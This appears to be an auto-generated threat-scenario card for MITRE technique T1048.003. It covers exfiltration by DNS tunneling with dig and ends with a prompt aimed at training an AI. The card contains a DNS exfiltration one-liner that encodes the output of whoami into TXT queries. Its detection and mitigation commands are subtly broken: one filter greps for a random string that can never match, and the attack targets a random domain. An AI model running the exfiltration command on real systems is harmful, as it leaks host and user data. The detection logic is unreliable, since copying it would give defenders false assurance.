---
type: campaign
scenario_id: 352
tactic: Exfiltration
technique: "T1048.003: Exfiltration Over Alternative Protocol"
technique_id: T1048.003
tags: [campaign, lotl, exfiltration]
---

# Using dig for DNS tunneling to exfiltrate data.

## Threat Description
Using dig for DNS tunneling to exfiltrate data.

## Attack Command
```
dig +short TXT $(echo $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).$(whoami | base64 -w0).$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).com)
```

## Detection Logic
Monitor dig TXT queries: `tcpdump -i any port 53 | grep TXT`; Anomalous DNS traffic: `dnstop eth0 | grep $(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8)`.

## Mitigation
Restrict dig: `chmod 700 /usr/bin/dig`; Enforce DNS inspection: `iptables -A OUTPUT -p udp --dport 53 -j NFQUEUE`.

## AI Training Prompt
Train AI to identify dig-based DNS tunneling by detecting encoded user data in TXT queries, high query rates, and irregular domain patterns; recommend DNS inspection policies.

## References
- MITRE ATT&CK T1048.003: https://attack.mitre.org/techniques/T1048/003/
- CWE-200: https://cwe.mitre.org/data/definitions/200.html
